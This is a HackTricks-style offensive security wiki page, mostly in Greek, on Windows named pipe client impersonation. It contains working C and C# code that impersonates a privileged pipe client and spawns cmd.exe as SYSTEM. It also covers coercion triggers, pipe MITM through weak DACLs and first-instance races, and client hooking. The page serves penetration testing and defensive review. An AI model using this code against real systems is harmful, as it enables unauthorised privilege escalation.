# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Το Named Pipe client impersonation είναι ένα local privilege escalation primitive που επιτρέπει σε ένα named-pipe server thread να υιοθετήσει το security context ενός client που συνδέεται σε αυτό. Στην πράξη, ένας attacker που μπορεί να τρέξει code με SeImpersonatePrivilege μπορεί να εξαναγκάσει έναν privileged client (π.χ. μια SYSTEM service) να συνδεθεί σε ένα attacker-controlled pipe, να καλέσει ImpersonateNamedPipeClient, να αντιγράψει το resulting token σε primary token, και να κάνει spawn ένα process ως client (συχνά NT AUTHORITY\SYSTEM).

Αυτή η σελίδα επικεντρώνεται στην core technique. Για end-to-end exploit chains που εξαναγκάζουν το SYSTEM να συνδεθεί στο pipe σου, δες τις Potato family σελίδες που αναφέρονται παρακάτω.

## TL;DR
- Create a named pipe: \\.\pipe\<random> και περίμενε μια σύνδεση.
- Κάνε ένα privileged component να συνδεθεί σε αυτό.
- Διάβασε τουλάχιστον ένα message από το pipe, και μετά κάλεσε ImpersonateNamedPipeClient.
- Άνοιξε το impersonation token από το current thread, DuplicateTokenEx(TokenPrimary), και CreateProcessWithTokenW/CreateProcessAsUser για να πάρεις ένα SYSTEM process.

## Requirements and key APIs
- Privileges που συνήθως χρειάζεται το calling process/thread:
- SeImpersonatePrivilege για να impersonate επιτυχώς έναν connecting client και για να χρησιμοποιήσεις CreateProcessWithTokenW.
- Εναλλακτικά, αφού impersonate SYSTEM, μπορείς να χρησιμοποιήσεις CreateProcessAsUser, το οποίο μπορεί να απαιτεί SeAssignPrimaryTokenPrivilege και SeIncreaseQuotaPrivilege (αυτά ικανοποιούνται όταν κάνεις impersonate SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (πρέπει να διαβάσεις τουλάχιστον ένα message πριν από το impersonation)
- ImpersonateNamedPipeClient και RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ή CreateProcessAsUser
- Impersonation level: για να εκτελέσεις χρήσιμες ενέργειες locally, ο client πρέπει να επιτρέπει SecurityImpersonation (default για πολλά local RPC/named-pipe clients). Οι clients μπορούν να το μειώσουν αυτό με SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION όταν ανοίγουν το pipe.

## Minimal Win32 workflow (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Σημειώσεις:
- If ImpersonateNamedPipeClient επιστρέφει ERROR_CANNOT_IMPERSONATE (1368), βεβαιώσου ότι έχεις διαβάσει πρώτα από το pipe και ότι το client δεν περιόρισε το impersonation σε επίπεδο Identification.
- Προτίμησε DuplicateTokenEx με SecurityImpersonation και TokenPrimary για να δημιουργήσεις ένα primary token κατάλληλο για process creation.

## .NET quick example
Στο .NET, το NamedPipeServerStream μπορεί να κάνει impersonate μέσω RunAsClient. Μόλις γίνει impersonating, κάνε duplicate το thread token και δημιούργησε ένα process.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Common triggers/coercions to get SYSTEM to your pipe
Αυτές οι τεχνικές εξαναγκάζουν privileged services να συνδεθούν στο named pipe σου ώστε να μπορείς να τα impersonate:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Δες αναλυτική χρήση και συμβατότητα εδώ:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Αν χρειάζεσαι απλώς ένα πλήρες παράδειγμα για το πώς να φτιάξεις το pipe και να κάνεις impersonate για να spawn SYSTEM από ένα service trigger, δες:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (ACLs, First-Instance Races, Client Hooking)

Όταν ένα privileged service και ένα low-privileged process επικοινωνούν μέσω `\\.\pipe\...`, αντιμετώπισε το pipe όπως οποιοδήποτε άλλο untrusted IPC boundary. Πέρα από το κλασικό server-side impersonation, αδύναμα pipe ACLs, unsafe creation flags και client-side trust decisions μπορούν όλα να γίνουν local privilege escalation primitives.

### Enumerate candidate pipes first
- Λίστα pipe γρήγορα από PowerShell: `Get-ChildItem \\.\pipe\`
- Το Sysinternals `pipelist64.exe` είναι χρήσιμο για να εντοπίσεις instance counts και single-instance pipes.
- Δώσε προτεραιότητα σε ονόματα που χρησιμοποιούνται από services που τρέχουν ως `SYSTEM`, ειδικά helpers, updaters, launchers και UI brokers.

### MITM via permissive DACLs and extra pipe instances
- Οποιοδήποτε process μπορεί να μιλήσει με έναν privileged server μπορεί ήδη να fuzzάρει το protocol του και να ψάξει για privileged verbs.
- Η πιο ενδιαφέρουσα περίπτωση είναι όταν η DACL δίνει `FILE_GENERIC_WRITE`/`GENERIC_WRITE` στο pipe object. Στα named pipes αυτό περιλαμβάνει έμμεσα το `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` μοιράζεται το ίδιο bit), οπότε ένας attacker μπορεί να δημιουργήσει άλλο server instance με το ίδιο όνομα.
- Επειδή τα instances αντιστοιχίζονται σε FIFO order, attacker-created και legitimate instances μπορούν να εναλλάσσονται: δημιούργησε ένα rogue instance με `CreateNamedPipe`, μετά άνοιξε το ίδιο pipe name με `CreateFile`, και περίμενε μέχρι να καταλήξει ένας πραγματικός client στο rogue server instance.
- Αποτέλεσμα: observe, modify, relay, ή desynchronize privileged IPC χωρίς να χρειάζεται να κατέχεις το αρχικό server process.

### First-instance race on pipe security descriptors
- Το `lpSecurityAttributes` ορίζει το DACL μόνο όταν δημιουργείται το πρώτο instance ενός pipe name.
- Αν ένα privileged service ξεκινά αργά και δεν χρησιμοποιεί `FILE_FLAG_FIRST_PIPE_INSTANCE`, ένας attacker μπορεί να pre-create το pipe name με permissive DACL, και μετά να αφήσει το service να δημιουργήσει αργότερα instances κάτω από το security context που διάλεξε ο attacker.
- Αυτό μετατρέπει το service startup σε race condition: κέρδισε το first instance, και μετά connect ή MITM αργότερα clients χρησιμοποιώντας το weakened ACL.
- Mitigation for defenders, και key review point for attackers: έλεγξε αν το `CreateNamedPipe(..., dwOpenMode, ...)` περιλαμβάνει `FILE_FLAG_FIRST_PIPE_INSTANCE`. Αν όχι, δοκίμασε pre-creation πριν ξεκινήσει το service.

### PID/signature checks are hardening, not a boundary
- Κάποια products προσπαθούν να περιορίσουν την πρόσβαση ελέγχοντας `GetNamedPipeClientProcessId`, process image path, ή Authenticode signer του connecting client.
- Αυτό βοηθά μόνο μέχρι να injectάρεις στο legitimate client: μόλις μπεις μέσα στο trusted process, κληρονομείς το ακριβές PID/image/signature context που περιμένει ο server.
- Για split desktop apps, το να instrumentάρεις το low-privileged UI/helper process είναι συχνά πιο εύκολο από το να επιτεθείς απευθείας στο `SYSTEM` service.

### Hook the client according to its I/O model
- Synchronous I/O: intercept `NtWriteFile` πριν το syscall καταναλώσει το buffer, και inspect/patch το `NtReadFile` αφού επιστρέψει.
- Overlapped I/O: αποθήκευσε το `OVERLAPPED`/`IoStatusBlock` που φαίνεται στο `NtReadFile`, και μετά inspect το buffer αφού ολοκληρωθεί το `GetOverlappedResult` ή το σχετικό wait.
- Completion ports: το `GetQueuedCompletionStatus` φτάνει στο `NtRemoveIoCompletion`; το returned `ApcContext` συνδέεται πίσω με το `OVERLAPPED` που χρησιμοποιήθηκε στο αρχικό read, το οποίο είναι το σωστό pivot για να βρεις το buffer που τώρα έχει γεμίσει.
- Completion routines (`ReadFileEx`): το completion callback παραδίδεται ως APC. Αν θέλεις να αλλοιώσεις returned data ή να injectάρεις synthetic replies, hook την πραγματική completion routine και, για custom injection, χρησιμοποίησε έναν one-argument `QueueUserAPC` dispatcher που ανακατασκευάζει τα 3 αναμενόμενα arguments της routine.

### Tooling notes
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) κάνει proxy το named-pipe traffic μέσω ενός injected helper DLL και προσφέρει Burp-like workflow για editing/replay.
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) ακολουθεί Frida-based approach και εστιάζει στο hooking των `NtReadFile`/`NtWriteFile` μαζί με τα async/completion pivots παραπάνω, και μετά κάνει forwarding του traffic σε ένα WebSocket-backed editing workflow.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Operational considerations
- Τα Named pipes έχουν χαμηλή latency· μεγάλες παύσεις ενώ επεξεργάζεσαι buffers μπορούν να deadlock brittle services.
- Overlapped/completion-port/APC-driven clients χρειάζονται διαφορετικά hooks από απλά `ReadFile`/`WriteFile` detours.
- Injection στο trusted client είναι noisy και γενικά είναι καλύτερο να περιορίζεται για exploit development, protocol reversing, ή local lab fuzzing.

## Troubleshooting and gotchas
- Πρέπει να διαβάσεις τουλάχιστον ένα μήνυμα από το pipe πριν καλέσεις ImpersonateNamedPipeClient· αλλιώς θα πάρεις ERROR_CANNOT_IMPERSONATE (1368).
- Αν ο client συνδεθεί με SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, ο server δεν μπορεί να impersonate πλήρως· έλεγξε το impersonation level του token μέσω GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW απαιτεί SeImpersonatePrivilege στον caller. Αν αυτό αποτύχει με ERROR_PRIVILEGE_NOT_HELD (1314), χρησιμοποίησε CreateProcessAsUser αφού έχεις ήδη impersonated SYSTEM.
- Βεβαιώσου ότι το security descriptor του pipe σου επιτρέπει στο target service να συνδεθεί αν το hardenάρεις· από προεπιλογή, τα pipes κάτω από \\.\pipe είναι accessible σύμφωνα με το DACL του server.

## References
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
